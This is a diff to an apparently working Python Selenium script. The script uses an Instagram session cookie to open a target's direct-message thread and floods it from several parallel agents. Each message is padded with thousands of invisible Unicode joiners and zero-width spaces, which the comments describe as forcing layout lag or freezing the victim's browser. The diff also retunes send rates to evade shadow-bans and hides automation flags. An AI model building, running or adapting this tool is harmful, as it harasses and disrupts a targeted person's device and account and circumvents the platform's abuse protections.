@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (STICKY-MATRIX V34)
-# 📅 STATUS: UI-DOMINATION | 4-AGENT TOTAL | AWS-LOCK
+# 🚀 PROJECT: PRAVEER.OWNS (VISIBLE-LOCK V35)
+# 📅 STATUS: SERVER-BYPASS | 4-AGENT TOTAL | AWS-CPU-TARGET
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -13,29 +13,30 @@ from selenium.webdriver.chrome.options import Options
 # --- 4 AGENTS TOTAL CONFIG ---
 AGENTS_PER_MACHINE = 2             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.08)  # 🔥 Hyper-drive for total saturation
-REST_AFTER_STRIKES = 300    # Sustained pressure
-REST_DURATION = 2          
+BURST_SPEED = (0.2, 0.5)    # ✅ Slower burst prevents the "Invisible" Shadow-Ban
+REST_AFTER_STRIKES = 100   
+REST_DURATION = 5          
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_sticky_payload():
-    """Generates a high-frequency render-block to freeze opponent UI."""
+def get_visible_lock_payload():
+    """Generates a visible branded payload with hidden layout-lag code."""
     u_id = random.randint(1000, 9999)
-    # \u200D = ZWJ | \u2060 = WJ | \u2068 = Isolate
-    # This specific sequence prevents the browser from skipping the render.
-    zwj, glue, iso, pop = "\u200D", "\u2060", "\u2068", "\u2069"
+    # \u2060 = Word Joiner (Invisible but forces layout math)
+    # \u200B = Zero Width Space (Invisible but forces wrap checks)
+    glue, brk = "\u2060", "\u200B"
     
-    header = f"👑 PRAVEER PAPA ON TOP 🌙 [MATRIX_LOCKED_{u_id}]"
+    # 👑 THE BRANDING (This is what will be visible)
+    header = f"👑 PRAVEER PAPA ON TOP 🌙 [NODE:{u_id}]"
     
     body = []
-    # Maximum 390 lines to hit the 10,000 character hard limit
-    for i in range(390):
-        # Nested directional isolates combined with Moon-ZWJ-Bonding
-        # This forces the HarfBuzz engine into an infinite font-fallback loop
-        line = f"{iso}{iso}𝕻{zwj}𝚁{zwj}𝕬{zwj}𝚅{zwj}𝕰{zwj}𝕰{zwj}𝕽{zwj}🌙{i}{pop*2}{glue}"
+    # 350 lines of invisible math
+    for i in range(350):
+        # We sandwich the visible name between thousands of invisible joiners
+        # The server sees 'PRAVEER PAPA', but the browser sees a 10,000px wide line.
+        line = f"PRAVEER PAPA {i} ON TOP 🌙{glue*20}{brk*10}"
         body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
@@ -46,9 +47,10 @@ def get_driver(agent_id):
         chrome_options.add_argument("--headless=new") 
         chrome_options.add_argument("--no-sandbox") 
         chrome_options.add_argument("--disable-dev-shm-usage")
-        chrome_options.add_argument("--disable-gpu") # Force CPU to lock the Main Thread
+        chrome_options.add_argument("--disable-gpu")
         
         ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
+        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
         chrome_options.add_argument(f"user-agent={ua}")
         
         driver = webdriver.Chrome(options=chrome_options)
@@ -62,20 +64,20 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(12) 
+            time.sleep(15) 
             
             while True:
-                payload = get_sticky_payload()
+                payload = get_visible_lock_payload()
                 try:
                     box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
-                    # Direct JS injection to bypass local input lag
                     driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, payload)
+                    time.sleep(0.5) # ✅ Small delay to ensure server registration
                     box.send_keys(Keys.ENTER)
                     
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Locked ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Visible Strike ({GLOBAL_SENT})")
                 except:
                     break 
 
@@ -83,7 +85,7 @@ def run_life_cycle(agent_id, cookie, target):
         except: pass
         finally:
             if driver: driver.quit()
-            time.sleep(2)
+            time.sleep(5)
 
 def main():
     cookie = os.environ.get("INSTA_COOKIE", "").strip()
